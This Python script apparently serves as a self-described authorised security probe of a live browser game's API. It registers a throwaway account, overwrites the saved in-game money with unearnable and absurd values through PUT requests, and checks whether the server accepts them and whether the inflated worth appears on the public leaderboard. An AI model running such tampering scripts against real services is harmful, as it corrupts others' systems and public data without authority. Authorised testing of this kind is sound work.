#!/usr/bin/env python3
"""
Lagos Life - DECISIVE LIVE TEST (authorised).

Question: does the live /api/save accept a client-authored `money`, or does the
server reject/clamp it?

Method (throwaway account, nobody else affected):
  1. register {username,password,name,adult:true}  (schema read from the bundle)
  2. GET /api/save                      -> baseline money + updatedAt
  3. mutate game.money to a distinctive, unearnable value
  4. PUT /api/save with base = updatedAt from step 2
  5. GET /api/save                      -> did it stick?
  6. probe the ceiling: an absurd value, to see if the server clamps or rejects
  7. GET /api/forbes                    -> does the inflated netWorth publish?

Session is a first-party cookie (bundle uses credentials:"same-origin"),
so drive it with a cookie jar.
"""
import json, os, random, string, time, urllib.request, urllib.error, http.cookiejar

BASE = "https://lagoslife.eliysites.com"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/125.0 Safari/537.36")
CREDS = "/tmp/ll_probe_creds.json"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def api(path, method="GET", body=None):
    headers = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
               "Origin": BASE, "Referer": BASE + "/"}
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, method=method, data=data, headers=headers)
    try:
        with opener.open(r, timeout=40) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            return e.code, json.loads(raw or b"{}")
        except Exception:
            return e.code, {"raw": raw[:300].decode("utf-8", "replace")}
    except Exception as e:
        return None, {"err": str(e)}


def money_of(save_obj):
    g = (save_obj or {}).get("game")
    if not isinstance(g, dict):
        return None
    return g.get("money")


print("=" * 92)
print("STEP 1 - register a throwaway account")
print("=" * 92)
uname = "zzprobe" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
pw = "Probe!" + "".join(random.choices(string.ascii_letters + string.digits, k=14))
payload = {"username": uname, "password": pw, "name": "Probe Account",
           "email": None, "adult": True}
st, j = api("/api/auth/register", "POST", payload)
print(f"  username = {uname}")
print(f"  POST /api/auth/register -> HTTP {st}\n  {json.dumps(j)[:400]}")
json.dump({"username": uname, "password": pw}, open(CREDS, "w"))

st, j = api("/api/auth/me")
print(f"\n  GET /api/auth/me -> HTTP {st}\n  {json.dumps(j)[:300]}")
if not (j or {}).get("user"):
    print("\n!! not logged in - stopping")
    raise SystemExit(1)

print("\n" + "=" * 92)
print("STEP 2 - baseline save (before any tampering)")
print("=" * 92)
st, base_save = api("/api/save")
print(f"  GET /api/save -> HTTP {st}")
if not isinstance(base_save, dict) or "game" not in base_save:
    print(f"  body: {json.dumps(base_save)[:400]}")
print(f"  updatedAt      = {base_save.get('updatedAt')}")
print(f"  game.money     = {money_of(base_save)}")
g0 = base_save.get("game")
if isinstance(g0, dict):
    print(f"  game keys ({len(g0)}) = {sorted(g0.keys())[:28]}")
json.dump(base_save, open("/tmp/ll_save_before.json", "w"), indent=2)

if not isinstance(g0, dict):
    print("\n!! no game object yet - the account may need a first save. stopping.")
    raise SystemExit(1)

print("\n" + "=" * 92)
print("STEP 3 - THE TEST: set money client-side, PUT it, read it back")
print("=" * 92)
TARGET = 987_654_321          # ~N987m: unearnable on a 5-minute-old account, under the 5e9 ceiling
g1 = json.loads(json.dumps(g0))
g1["money"] = TARGET
body = {"game": {**g1, "outbox": {"notices": [], "fx": []}},
        "base": base_save.get("updatedAt")}
st, j = api("/api/save", "PUT", body)
print(f"  PUT money={TARGET:,} -> HTTP {st}\n  resp: {json.dumps(j)[:300]}")

if st == 409:
    cur = (j or {}).get("game")
    cur_at = (j or {}).get("updatedAt")
    print(f"  409 conflict. server updatedAt={cur_at}. retrying with that base...")
    body["base"] = cur_at
    st, j = api("/api/save", "PUT", body)
    print(f"  PUT (retry) -> HTTP {st}\n  resp: {json.dumps(j)[:300]}")

print("\n" + "=" * 92)
print("STEP 4 - READ BACK (the only thing that matters)")
print("=" * 92)
st, after = api("/api/save")
got = money_of(after)
print(f"  GET /api/save -> HTTP {st}")
print(f"  money BEFORE our PUT = {money_of(base_save)}")
print(f"  money we PUT         = {TARGET:,}")
print(f"  money the SERVER returns = {got}")
if got == TARGET:
    print("\n  *** CONFIRMED: the server persisted a client-authored balance. ***")
elif got is None:
    print("\n  no game on read-back")
else:
    print(f"\n  *** server changed it -> delta vs our PUT: {got - TARGET:+,} ***")
json.dump(after, open("/tmp/ll_save_after.json", "w"), indent=2)

print("\n" + "=" * 92)
print("STEP 5 - ceiling probe: absurd value, does the server clamp or reject?")
print("=" * 92)
for probe_val in (10**15, 5_000_000_000, 9_999_999_999_999):
    st, cur_save = api("/api/save")
    gg = json.loads(json.dumps(cur_save.get("game") or {}))
    gg["money"] = probe_val
    st2, j2 = api("/api/save", "PUT",
                  {"game": {**gg, "outbox": {"notices": [], "fx": []}},
                   "base": cur_save.get("updatedAt")})
    st3, rb = api("/api/save")
    print(f"  PUT {probe_val:>18,} -> HTTP {st2}  | server now returns money="
          f"{money_of(rb)}")

print("\n" + "=" * 92)
print("STEP 6 - does the inflated net worth publish to the PUBLIC leaderboard?")
print("=" * 92)
st, fb = api("/api/forbes")
mine = (fb or {}).get("mine")
print(f"  GET /api/forbes -> HTTP {st}")
print(f"  total ranked = {(fb or {}).get('total')}")
print(f"  mine         = {json.dumps(mine)}")
top = (fb or {}).get("top") or []
hit = [e for e in top if e.get("username") == uname]
print(f"  in public top list? {json.dumps(hit) if hit else 'not in top slice'}")
json.dump(fb, open("/tmp/ll_forbes_after.json", "w"), indent=2)

print("\n" + "=" * 92)
print(f"PROBE ACCOUNT: @{uname}   (credentials at {CREDS})")
print("=" * 92)
